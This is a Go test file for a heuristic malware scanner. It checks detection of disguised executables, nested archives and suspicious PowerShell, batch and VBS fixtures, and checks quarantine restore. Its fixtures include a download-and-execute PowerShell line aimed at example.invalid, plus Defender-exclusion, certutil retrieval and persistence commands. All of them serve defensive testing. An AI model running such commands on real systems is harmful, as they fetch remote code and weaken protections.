package main

import (
 "archive/zip"
 "bytes"
 "context"
 "encoding/binary"
 "fmt"
 "os"
 "path/filepath"
 "strings"
 "testing"
 "time"
 "unicode/utf16"
)
type fixture struct{name,filename string;body []byte;entries map[string][]byte;flag bool}
func fixturePE() []byte {
 b:=make([]byte,192);copy(b,"MZ");binary.LittleEndian.PutUint32(b[0x3c:0x40],128);copy(b[128:],[]byte{'P','E',0,0});return b
}
func fixtureUTF16(s string,bom bool) []byte{
 b:=[]byte{};if bom{b=[]byte{0xff,0xfe}}
 for _,v:=range utf16.Encode([]rune(s)){b=binary.LittleEndian.AppendUint16(b,v)};return b
}
func fixtureZIP(t testing.TB, entries map[string][]byte) []byte{
 t.Helper();var b bytes.Buffer;z:=zip.NewWriter(&b)
 for n,data:=range entries{w,err:=z.Create(n);if err!=nil{t.Fatal(err)};if _,err=w.Write(data);err!=nil{t.Fatal(err)}}
 if err:=z.Close();err!=nil{t.Fatal(err)};return b.Bytes()
}
func evaluateFixtures(t *testing.T,group string, cases []fixture,wantTP,wantFP int){
 t.Helper();d:=t.TempDir();tp,fn,fp,tn:=0,0,0,0
 for i,c:=range cases{
  dir:=filepath.Join(d,fmt.Sprintf("%03d",i));if err:=os.MkdirAll(dir,0700);err!=nil{t.Fatal(err)}
  p:=filepath.Join(dir,c.filename);data:=c.body;if c.entries!=nil{data=fixtureZIP(t,c.entries)}
  if err:=os.WriteFile(p,data,0600);err!=nil{t.Fatal(err)}
  st,err:=os.Stat(p);if err!=nil{t.Fatal(err)}
  found:=inspectFile(p,st)!=nil
  if found&&c.flag{tp++}else if !found&&c.flag{fn++;t.Logf("MISSED %s",c.name)}else if found&&!c.flag{fp++;t.Logf("FALSE FLAG %s",c.name)}else{tn++}
 }
 t.Logf("%s: TP=%d FN=%d FP=%d TN=%d; synthetic recall=%.1f%%, false-positive rate=%.1f%%",group,tp,fn,fp,tn,100*float64(tp)/float64(tp+fn),100*float64(fp)/float64(fp+tn))
 if tp!=wantTP||fp!=wantFP{t.Fatalf("regression on %s",group)}
}
func TestSyntheticDetectionQuality(t *testing.T){
 remote:="IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/unused')"
 baseline:=[]fixture{
 {"double-extension EXE","invoice.pdf.exe",[]byte("inert"),nil,true},
 {"double-extension script","holiday.jpg.js",[]byte("// inert"),nil,true},
 {"system impersonation","svchost.exe",[]byte("inert"),nil,true},
 {"download-execute script","remote.ps1",[]byte(remote),nil,true},
 {"encoded-command","encoded.bat",[]byte("powershell -NoProfile -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),nil,true},
 {"base64-execute","decode.ps1",[]byte("IEX ([Convert]::FromBase64String('AAAA'))"),nil,true},
 {"defender exclusion","defender.ps1",[]byte("Add-MpPreference -ExclusionPath 'C:\\example'"),nil,true},
 {"certutil retrieval","download.cmd",[]byte("certutil -urlcache -f http://example.invalid/n test.dat"),nil,true},
 {"scheduled task","task.cmd",[]byte("schtasks /create /tn sample /tr powershell.exe"),nil,true},
 {"Run key persistence","run.vbs",[]byte("WScript.Shell RegWrite \\CurrentVersion\\Run"),nil,true},
 {"ZIP double extension","archive.zip",nil,map[string][]byte{"picture.png.exe":[]byte("inert")},true},
 {"ZIP remote script","scripts.zip",nil,map[string][]byte{"run.ps1":[]byte(remote)},true},
 {"docx disguised executable","report.docx",nil,map[string][]byte{"word/assets/notes.txt.exe":[]byte("inert")},true},
 {"ZIP disguised PE","photos.zip",nil,map[string][]byte{"dog.jpg":fixturePE()},true},
 {"disguised image PE","logo.jpg",fixturePE(),nil,true},
 {"UTF16 BOM script","unicode.ps1",fixtureUTF16(remote,true),nil,true},
 {"ZIP UTF16 script","utf16.zip",nil,map[string][]byte{"inside.ps1":fixtureUTF16(remote,true)},true},
 {"normal EXE","normal.exe",[]byte("inert"),nil,false},
 {"normal powershell","normal.ps1",[]byte("Write-Host hello"),nil,false},
 {"normal VBS","normal.vbs",[]byte("MsgBox test"),nil,false},
 {"normal picture","normal.png",[]byte("PNG"),nil,false},
 {"MZ text","mz.txt",[]byte("MZ means an abbreviation, not a binary."),nil,false},
 {"MZ PDF text","mz.pdf",[]byte("MZ document without PE header"),nil,false},
 {"normal ZIP","normal.zip",nil,map[string][]byte{"readme.txt":[]byte("hi")},false},
 {"normal DOCX","normal.docx",nil,map[string][]byte{"word/document.xml":[]byte("<w/>")},false},
 {"download only","get.ps1",[]byte("Invoke-WebRequest http://example.invalid/n -OutFile file.txt"),nil,false},
 {"execute only","exec.ps1",[]byte("Invoke-Expression 'Write-Output hello'"),nil,false},
 {"decode only","base64.ps1",[]byte("[Convert]::FromBase64String('AAAA')"),nil,false},
 {"normal script ZIP","script.zip",nil,map[string][]byte{"run.ps1":[]byte("Write-Host hi")},false},
 {"normal JAR","app.jar",[]byte("META-INF"),nil,false},
 {"normal JS","app.js",[]byte("fetch('/api/status')"),nil,false},
 {"normal MSI","app.msi",[]byte("inert"),nil,false},
 {"certutil hash","hash.cmd",[]byte("certutil -hashfile report.pdf SHA256"),nil,false},
 }
 evaluateFixtures(t,"BASELINE",baseline,17,0)
 innerBad:=fixtureZIP(t,map[string][]byte{"invoice.pdf.exe":[]byte("inert")})
 innerScript:=fixtureZIP(t,map[string][]byte{"run.ps1":[]byte(remote)})
 innerGood:=fixtureZIP(t,map[string][]byte{"readme.txt":[]byte("ordinary")})
 challenge:=[]fixture{
 {"nested disguised","nested.zip",nil,map[string][]byte{"bundle.zip":innerBad},true},
 {"nested script","nestedcode.zip",nil,map[string][]byte{"bundle.zip":innerScript},true},
 {"macro document","macro.docm",nil,map[string][]byte{"word/content/tax.pdf.exe":[]byte("inert")},true},
 {"JAR suspicious entry","suspicious.jar",nil,map[string][]byte{"bill.pdf.exe":[]byte("inert")},true},
 {"Unicode RTL override","report\u202eexe.txt",[]byte("inert"),nil,true},
 {"UTF16 no BOM","nobom.ps1",fixtureUTF16(remote,false),nil,true},
 {"UTF16BE script","bigendian.ps1",fixtureUTF16BE(remote),nil,true},
 {"GIF PE disguise","gif.gif",fixturePE(),nil,true},
 {"WEBP PE disguise","webp.webp",fixturePE(),nil,true},
 {"nested benign","nested-good.zip",nil,map[string][]byte{"bundle.zip":innerGood},false},
 {"normal JAR manifest","normal.jar",nil,map[string][]byte{"META-INF/MANIFEST.MF":[]byte("Manifest-Version: 1.0")},false},
 {"ordinary Hebrew","עברית.txt",[]byte("hello"),nil,false},
 {"GIF header","normal.gif",[]byte("GIF89a"),nil,false},
 {"WEBP header","normal.webp",[]byte("RIFFxxxxWEBP"),nil,false},
 {"normal macro document","valid.docm",nil,map[string][]byte{"word/document.xml":[]byte("<w/>")},false},
 {"ZIP MZ text","mz.zip",nil,map[string][]byte{"test.txt":[]byte("MZ is a name")},false},
 }
 evaluateFixtures(t,"CHALLENGE",challenge,9,0)
}
func fixtureUTF16BE(s string) []byte{
 b:=[]byte{0xfe,0xff};for _,v:=range utf16.Encode([]rune(s)){b=binary.BigEndian.AppendUint16(b,v)};return b
}
func TestBulkSyntheticScan(t *testing.T){
 d:=t.TempDir()
 for i:=0;i<1300;i++{
  name:=fmt.Sprintf("normal-%04d.txt",i)
  if i<13{name=fmt.Sprintf("disguised-%04d.pdf.exe",i)}
  if err:=os.WriteFile(filepath.Join(d,name),[]byte("inert"),0600);err!=nil{t.Fatal(err)}
 }
 a:=newApp(nil);start:=time.Now()
 if err:=a.runHeuristic(context.Background(),"custom",d);err!=nil{t.Fatal(err)}
 status,fs:=a.snapshot();t.Logf("BULK: %d files, %d findings, %s",status.Files,len(fs),time.Since(start))
 if status.Files!=1300||len(fs)!=13{t.Fatal("bulk count mismatch")}
}
func TestCorruptArchiveSafe(t *testing.T){
 p:=filepath.Join(t.TempDir(),"invalid.zip")
 if err:=os.WriteFile(p,[]byte("not an archive"),0600);err!=nil{t.Fatal(err)}
 st,_:=os.Stat(p);if inspectFile(p,st)!=nil{t.Fatal("corrupt archive flagged as malicious")}
}
func TestRestoreExistingPathProtection(t *testing.T){
 d:=t.TempDir();v:=&Vault{path:filepath.Join(d,"quarantine")};if err:=os.MkdirAll(v.path,0700);err!=nil{t.Fatal(err)}
 p:=filepath.Join(d,"suspicious.pdf.exe");_ = os.WriteFile(p,[]byte("original"),0600)
 st,_:=os.Stat(p);f:=inspectFile(p,st);if f==nil{t.Fatal("fixture not flagged")}
 item,err:=v.quarantine(*f);if err!=nil{t.Fatal(err)}
 _ = os.WriteFile(p,[]byte("replacement"),0600)
 if err:=v.restore(item.ID);err==nil{t.Fatal("restore overwrote existing path")}
 b,_:=os.ReadFile(p);if string(b)!="replacement"{t.Fatal("replacement corrupted")}
}
func BenchmarkInspectSafeZIP(b *testing.B){
 d:=b.TempDir();p:=filepath.Join(d,"normal.zip")
 if err:=os.WriteFile(p,fixtureZIP(b,map[string][]byte{"readme.txt":bytes.Repeat([]byte("normal"),200)}),0600);err!=nil{b.Fatal(err)}
 st,_:=os.Stat(p);b.ReportAllocs();b.ResetTimer()
 for i:=0;i<b.N;i++{inspectFile(p,st)}
}
func BenchmarkInspectScript(b *testing.B){
 p:=filepath.Join(b.TempDir(),"normal.ps1")
 if err:=os.WriteFile(p,[]byte(strings.Repeat("Write-Host hello\n",200)),0600);err!=nil{b.Fatal(err)}
 st,_:=os.Stat(p);b.ReportAllocs();b.ResetTimer()
 for i:=0;i<b.N;i++{inspectFile(p,st)}
}
